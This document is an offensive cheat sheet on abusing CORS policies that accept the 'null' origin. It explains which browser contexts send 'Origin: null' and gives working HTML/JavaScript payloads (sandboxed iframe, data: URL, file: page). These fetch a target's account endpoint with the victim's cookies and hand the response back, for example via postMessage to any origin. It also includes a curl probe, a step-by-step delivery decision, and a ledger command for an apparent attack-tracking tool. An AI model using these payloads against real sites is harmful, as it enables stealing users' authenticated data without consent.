# The null origin — opaque-context carriers

`Origin: null` is sent by requests from opaque origins — contexts
with no real origin. When the server allows `null`, a sandboxed or
data: page reads the credentialed response.

---

## 1. What produces Origin: null

```text
- a sandboxed iframe WITHOUT allow-same-origin (the classic carrier)
- a data: URL page
- a file: page
- a javascript:/about:/blob: opaque context
- a redirect through an opaque context — a chain that loses the origin
- a request from a browser-extension page (moz-extension:/chrome-)
- a request with a no-referrer/opaque policy in some engines
```

## 2. The sandboxed-iframe carrier — the canonical shape

```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://t/api/me',{credentials:'include'})
  .then(r=>r.text()).then(d=>parent.postMessage(d,'*'));
</script>">
</iframe>
```

The `sandbox` attribute without `allow-same-origin` gives the iframe
an OPAQUE origin — its requests send `Origin: null`. If the server
accepts `null`, the read works.

## 3. The data: URL carrier — a self-contained page

```html
<script>
location='data:text/html,<script>fetch(\'https://t/api/me\',{credentials:\'include\'}).then(r=>r.text()).then(d=>console.log(d))<\/script>';
</script>
```

A `data:` page is an opaque origin — `Origin: null`.

## 4. The "the check allows null" — the acceptance surface

```text
the server accepts 'null' as an allowed origin when:
- the check does `if origin in allowlist` and 'null' is IN the list
  (a developer added it for a sandboxed iframe legitimately)
- the check reflects ANY origin — 'null' reflects back
- the check treats 'null' as absent → absent → allow
- the check does a null-safe compare that passes 'null'
```

```bash
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: null' | \
  grep -i 'access-control-allow-origin'
# ACAO: null → the opaque-origin read is open
```

## 5. The null + credentials combo — the real vuln

```text
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
→ a sandboxed/data:/file: page reads the response WITH the victim's
  cookies — a full credentialed read via an opaque context.
```

## 6. The sandbox attribute matrix — which produces null

| iframe | Origin |
|---|---|
| `<iframe src=x>` (no sandbox) | the src's origin |
| `<iframe sandbox src=x>` | opaque — `null` |
| `<iframe sandbox="allow-scripts" src=x>` | opaque — `null` |
| `<iframe sandbox="allow-same-origin" src=x>` | the src's origin |
| `<iframe sandbox="allow-scripts allow-same-origin" src=x>` | the src's origin |

The `allow-same-origin` flag is what removes the null-ness — its
absence is the carrier.

## 7. The file: page — a local-context carrier

```html
<!-- a page saved and opened as file:// — opaque origin -->
<script>fetch('https://t/api/me',{credentials:'include'})
.then(r=>r.text()).then(d=>console.log(d))</script>
```

A `file:` page sends `Origin: null` — for a local-file-CSRF-read.

## 8. The redirect-loses-origin shape

```text
a request that redirects through an opaque context — a data: or a
chain — loses its origin → Origin: null on the final request.
```

## 9. The null-bypass decision

```text
the server allows 'null' → deliver via a sandboxed iframe or a
data: page → the credentialed read opens.
the server allows 'null' + ACAC → the full read.
```

## 10. The falsifier

```text
the server doesn't allow 'null' (ACAO isn't 'null' and doesn't
reflect) AND the real-origin checks are strict — the opaque-origin
carrier is closed.
```

## 11. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "null-origin: ACAO:null + ACAC -> sandboxed-iframe credentialed read"
```
